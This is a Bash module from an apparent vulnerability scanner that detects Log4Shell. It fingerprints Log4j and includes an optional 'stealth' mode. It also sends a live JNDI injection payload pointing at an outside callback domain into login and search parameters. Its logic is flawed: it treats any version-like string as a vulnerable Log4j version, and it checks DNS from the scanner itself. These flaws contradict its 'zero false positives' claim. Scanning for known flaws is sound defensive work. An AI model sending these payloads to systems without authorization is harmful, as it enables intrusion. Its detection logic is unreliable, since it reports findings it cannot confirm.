#!/bin/bash

# Log4Shell (CVE-2021-44228) Detection Module  
# Zero false positives through DNS callback confirmation

# Main detection function
detect_log4shell() {
    local target="$1"
    local stealth="$2"
    local callback_domain="$3"
    local results_file="$4"
    
    print_info "Running Log4Shell detection module"
    
    # Initialize confidence tracking
    local confidence_data
    confidence_data=$(init_confidence_tracking "$target" "log4shell")
    
    # Collect detection signals
    confidence_data=$(collect_log4shell_signals "$target" "$stealth" "$confidence_data")
    
    # Optional: Test for DNS callback if callback domain provided
    if [[ -n "$callback_domain" ]]; then
        confidence_data=$(test_log4shell_callback "$target" "$callback_domain" "$confidence_data")
    fi
    
    # Apply advanced correlation
    confidence_data=$(apply_advanced_correlation "log4shell" "$confidence_data")
    
    # Calculate final confidence
    confidence_data=$(calculate_confidence "$confidence_data")
    
    # Validate for reporting
    if validate_final_confidence "$confidence_data"; then
        # Render finding
        render_log4shell_finding "$confidence_data" "$results_file"
    else
        print_info "Log4Shell: Below confidence threshold, not reporting"
    fi
}

# Collect Log4Shell specific signals
collect_log4shell_signals() {
    local target="$1"
    local stealth="$2"
    local confidence_data="$3"
    
    # Signal 1: Log4j library fingerprint
    local log4j_detected=false
    local response
    response=$(make_http_request "$target" "GET" "" "$stealth")
    
    # Check for Log4j in various places
    local log4j_patterns=(
        "log4j"
        "org.apache.logging.log4j"
        "LOG4J"
        "log4j\.version"
        "log4j\."
    )
    
    for pattern in "${log4j_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_fingerprint" 1.0 "log4shell")
            log4j_detected=true
            break
        fi
    done
    
    # Signal 2: Check for vulnerable Log4j versions
    local version_detected=false
    local vulnerable_versions=("2.0" "2.1" "2.2" "2.3" "2.4" "2.5" "2.6" "2.7" "2.8" "2.9" "2.10" "2.11" "2.12" "2.13" "2.14" "2.15.0")
    
    # Check actuator endpoints for version info
    local version_endpoints=(
        "/actuator/env"
        "/management/env"
        "/env"
        "/info"
    )
    
    for endpoint in "${version_endpoints[@]}"; do
        local version_url="${target%/}${endpoint}"
        local version_response
        version_response=$(make_http_request "$version_url" "GET" "" "$stealth")
        
        # Extract potential Log4j versions
        local found_versions
        found_versions=$(echo "$version_response" | grep -Eo "[0-9]+\.[0-9]+(\.[0-9]+)?" | sort -u)
        
        for version in $found_versions; do
            for vulnerable_version in "${vulnerable_versions[@]}"; do
                if [[ "$version" == "$vulnerable_version" || "$version" =~ ^$vulnerable_version\. ]]; then
                    confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_version_vulnerable" 1.0 "log4shell")
                    version_detected=true
                    break 2
                fi
            done
        done
        
        # Also check for explicit version in error messages or headers
        if echo "$version_response" | grep -Eq "log4j\.version.*[0-9]+\.[0-9]+" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_version_vulnerable" 1.0 "log4shell")
            version_detected=true
            break
        fi
    done
    
    # Signal 3: Check for JNDI lookup patterns in configuration
    local jndi_detected=false
    local jndi_patterns=(
        "jndi:"
        "ldap://"
        "ldaps://"
        "rmi://"
        "dns://"
        "file://"
        "\$\{jndi:"
    )
    
    for pattern in "${jndi_patterns[@]}"; do
        if echo "$response" | grep -Eq "$pattern" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_jndi_enabled" 1.0 "log4shell")
            jndi_detected=true
            break
        fi
    done
    
    # Signal 4: Error page analysis (Log4Shell often shows in error pages)
    local error_check=false
    local error_endpoints=(
        "/error"
        "/404"
        "/500"
        "/non-existent-endpoint"
        "/test"
    )
    
    for endpoint in "${error_endpoints[@]}"; do
        local error_url="${target%/}${endpoint}"
        local error_response
        error_response=$(make_http_request "$error_url" "GET" "" "$stealth")
        
        # Check if response contains Log4j error traces
        if echo "$error_response" | grep -Eq "log4j|LOG4J|org.apache.logging" 2>/dev/null; then
            confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_error_trace" 0.8 "log4shell")
            error_check=true
            break
        fi
    done
    
    # Signal 5: Content-Type and Accept header analysis for log injection points
    local injection_points=false
    
    # Test POST endpoints that might log input
    local post_endpoints=(
        "/login"
        "/search"
        "/form"
        "/contact"
        "/api/login"
    )
    
    for endpoint in "${post_endpoints[@]}"; do
        local post_url="${target%/}${endpoint}"
        
        # Try to detect if endpoint exists and might log input
        local head_response
        head_response=$(make_full_request "$post_url" "HEAD" "" "$stealth")
        local status_code
        status_code=$(echo "$head_response" | jq -r '.status_code')
        
        if [[ "$status_code" =~ ^(200|405|501)$ ]]; then
            # Endpoint exists or allows POST - potential logging surface
            confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_injection_surface" 0.6 "log4shell")
            injection_points=true
            break
        fi
    done
    
    echo "$confidence_data"
}

# Test for DNS callback (high confidence signal)
test_log4shell_callback() {
    local target="$1"
    local callback_domain="$2"
    local confidence_data="$3"
    
    local timestamp
    timestamp=$(date +%s)
    local callback_subdomain
    callback_subdomain="${timestamp}.${callback_domain}"
    
    # Craft JNDI payload for DNS callback
    local jndi_payload
    jndi_payload='${jndi:ldap://'"$callback_subdomain"'/test}'
    
    # Test injection points
    local injection_endpoints=(
        "/login"
        "/search"
        "/form"
        "/api/login"
    )
    
    for endpoint in "${injection_endpoints[@]}"; do
        local injection_url="${target%/}${endpoint}"
        
        # Try POST with JNDI payload in common parameters
        local test_params=(
            "username=${jndi_payload}&password=test"
            "q=${jndi_payload}"
            "search=${jndi_payload}"
            "name=${jndi_payload}"
            "input=${jndi_payload}"
        )
        
        for param in "${test_params[@]}"; do
            # Make request with payload (will not execute, just test logging)
            local callback_response
            callback_response=$(make_http_request "$injection_url" "POST" "$param" "$stealth")
            
            # Wait for potential DNS callback
            sleep 5
            
            # Check if callback domain was resolved
            local dns_result
            dns_result=$(dig "$callback_subdomain" A +short 2>/dev/null || echo "")
            
            if [[ -n "$dns_result" ]]; then
                confidence_data=$(add_confidence_signal "$confidence_data" "log4shell_dns_callback" 1.0 "log4shell")
                print_success "Log4Shell DNS callback detected: $dns_result"
                break 2
            fi
        done
    done
    
    echo "$confidence_data"
}

# Render Log4Shell finding
render_log4shell_finding() {
    local confidence_data="$1"
    local results_file="$2"
    
    local confidence
    confidence=$(echo "$confidence_data" | jq -r '.confidence')
    local level
    level=$(get_confidence_level "$confidence")
    local explanation
    explanation=$(generate_confidence_explanation "$confidence_data")
    local target
    target=$(echo "$confidence_data" | jq -r '.target')
    
    # Extract technical details
    local signals_detected
    signals_detected=$(echo "$confidence_data" | jq -r '.signals_detected[]')
    
    local evidence=""
    if echo "$signals_detected" | grep -q "fingerprint"; then
        evidence+="Log4j library detected; "
    fi
    if echo "$signals_detected" | grep -q "version_vulnerable"; then
        evidence+="Vulnerable Log4j version confirmed; "
    fi
    if echo "$signals_detected" | grep -q "jndi_enabled"; then
        evidence+="JNDI lookup patterns detected; "
    fi
    if echo "$signals_detected" | grep -q "dns_callback"; then
        evidence+="DNS callback confirmed (zero-day verification)"
    fi
    
    # Calculate technical severity
    local technical_severity="CRITICAL"
    if [[ $confidence -ge 95 ]]; then
        technical_severity="CRITICAL"
    elif [[ $confidence -ge 85 ]]; then
        technical_severity="HIGH"
    elif [[ $confidence -ge 70 ]]; then
        technical_severity="HIGH"
    else
        technical_severity="MEDIUM"
    fi
    
    # Render visual finding card
    print_finding_card "$technical_severity" "$confidence" "Log4Shell (CVE-2021-44228)" "$evidence" "$explanation"
    
    # Save to results file
    local finding_data
    finding_data=$(cat << EOF
{
    "target": "$target",
    "vulnerability": "Log4Shell",
    "cve": "CVE-2021-44228",
    "severity": "$technical_severity",
    "confidence": $confidence,
    "level": "$level",
    "evidence": "$evidence",
    "explanation": $(echo "$explanation" | jq -Rs '.'),
    "timestamp": "$(date -Iseconds)",
    "category": "Remote Code Execution",
    "description": "Critical Log4j JNDI lookup RCE vulnerability allowing remote code execution through malicious LDAP/NDI lookups in logged user input."
}
EOF
)
    
    # Append to results file (JSON array)
    local current_results
    current_results=$(cat "$results_file" 2>/dev/null || echo "[]")
    
    local updated_results
    updated_results=$(echo "$current_results" | jq ". += [$finding_data]")
    echo "$updated_results" > "$results_file"
}

# Export function for module loading
export -f detect_log4shell
export -f collect_log4shell_signals
export -f test_log4shell_callback
export -f render_log4shell_finding